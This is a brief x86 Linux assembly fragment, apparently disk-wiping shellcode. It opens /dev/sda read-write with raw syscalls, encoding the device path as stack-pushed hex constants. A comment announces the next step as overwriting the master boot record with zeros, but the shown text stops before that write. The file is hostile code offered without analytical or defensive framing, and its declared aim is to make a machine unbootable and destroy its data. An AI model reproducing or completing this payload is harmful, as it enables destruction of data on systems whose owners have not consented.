
SYS_OPEN equ		5
SYS_WRITE equ		4
O_RDWR equ		2

global _start

section .text

_start:
	; open the /dev/sda
	xor eax, eax
	push eax
	push 0x6164732f
	push 0x7665642f
	mov ebx, esp

	mov al, SYS_OPEN
	mov cl, O_RDWR
	int 0x80

	; write the MBR with zero's

